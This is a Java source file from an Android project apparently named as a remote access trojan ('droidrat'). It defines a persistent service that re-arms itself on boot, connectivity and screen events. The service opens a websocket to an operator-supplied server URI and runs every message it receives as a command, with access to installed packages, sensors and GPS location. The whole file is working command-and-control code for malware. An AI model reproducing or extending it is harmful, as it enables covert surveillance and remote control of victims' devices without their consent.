package com.je_chen.droidrat_je.service.command;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.hardware.SensorManager;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import com.je_chen.droidrat_je.command.process_super.CommandProcess;
import com.je_chen.droidrat_je.service.receiver.ServiceLive;
import com.je_chen.droidrat_je.socket.websocket.Websocket;

import java.net.URI;

public class ProcessCommandService extends Service {

    public static Websocket websocket;
    final String TAG = "ProcessCommandService ";
    PackageManager packageManager;

    SensorManager sensorManager;

    BroadcastReceiver broadcastReceiver;

    CommandProcess commandProcess;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onCreate() {
        super.onCreate();
        Log.v(TAG, "onCreate");
        try {
            broadcastReceiver = new ServiceLive();
            IntentFilter intentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
            intentFilter.addAction(Intent.ACTION_BOOT_COMPLETED);
            intentFilter.addAction(Intent.ACTION_SCREEN_ON);
            intentFilter.addAction(Intent.ACTION_SCREEN_OFF);
            this.registerReceiver(broadcastReceiver, intentFilter);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            String serverURI = null;

            if (intent == null)
                return START_STICKY;

            if (intent.hasExtra("URI")) {
                serverURI = intent.getStringExtra("URI");
            }

            packageManager = getPackageManager();

            sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);

            LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

            commandProcess = new CommandProcess(getApplicationContext(), packageManager, sensorManager, locationManager, "gps", 5000, 5);

            URI uri = URI.create(serverURI);
            if (Websocket.instance() == null) {
                websocket = new Websocket(uri, packageManager, this) {
                    @Override
                    public void onMessage(String message) {
                        Log.v(TAG, "Receiver : " + message);
                        commandProcess.processString(message);
                    }
                };
            }
            if (!websocket.isOpen())
                websocket.connect();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.v(TAG, "onDestroy");
        try {
            this.unregisterReceiver(broadcastReceiver);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
